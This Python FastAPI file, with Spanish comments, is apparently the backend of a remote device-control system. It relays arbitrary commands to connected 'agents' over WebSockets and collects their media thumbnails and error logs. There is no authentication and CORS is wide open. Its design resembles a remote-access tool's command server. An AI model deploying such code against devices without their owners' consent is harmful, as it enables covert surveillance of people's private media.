import json
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List

app = FastAPI(title="Agente Control Backend vFINAL")
app.add_middleware(
    CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"],
)

connected_agents: dict[str, dict] = {}
device_thumbnails_cache: dict[str, list] = {}

class Command(BaseModel):
    target_id: str
    action: str
    payload: str

class Thumbnail(BaseModel):
    filename: str
    thumbnail_b64: str

class ErrorLog(BaseModel):
    error: str

@app.websocket("/ws/{device_id}/{device_name:path}")
async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
    await websocket.accept()
    print(f"[CONEXIÓN] Agente conectado: '{device_name}' (ID: {device_id})")
    connected_agents[device_id] = {"ws": websocket, "name": device_name}
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        name_to_print = connected_agents.get(device_id, {}).get("name", f"ID: {device_id}")
        print(f"[DESCONEXIÓN] Agente desconectado: '{name_to_print}'")
        if device_id in connected_agents: del connected_agents[device_id]
        if device_id in device_thumbnails_cache: del device_thumbnails_cache[device_id]

# --- ¡LA RUTA QUE FALTABA! ---
@app.get("/api/get-agents")
async def get_agents():
    """Devuelve la lista de agentes actualmente conectados."""
    if not connected_agents:
        return []
    agent_list = [{"id": device_id, "name": data["name"]} for device_id, data in connected_agents.items()]
    return agent_list

# --- Y TODAS LAS DEMÁS RUTAS ---
@app.post("/api/send-command")
async def send_command_to_agent(command: Command):
    target_id = command.target_id
    if target_id not in connected_agents:
        return {"status": "error", "message": "Agente no conectado."}
    try:
        await connected_agents[target_id]["ws"].send_text(command.json())
        return {"status": "success"}
    except Exception:
        return {"status": "error"}

@app.post("/api/submit_media_list/{device_id}")
async def submit_media_list(device_id: str, thumbnails: List[Thumbnail]):
    if device_id not in connected_agents:
        return {"status": "error"}
    device_thumbnails_cache[device_id] = [thumb.dict() for thumb in thumbnails]
    return {"status": "success"}

@app.get("/api/get_media_list/{device_id}")
async def get_media_list(device_id: str):
    return device_thumbnails_cache.get(device_id, [])

@app.post("/api/log_error/{device_id}")
async def log_error_from_agent(device_id: str, error_log: ErrorLog):
    print(f"[ERROR REMOTO] Dispositivo {device_id[:8]}: {error_log.error}")
    return {"status": "log recibido"}
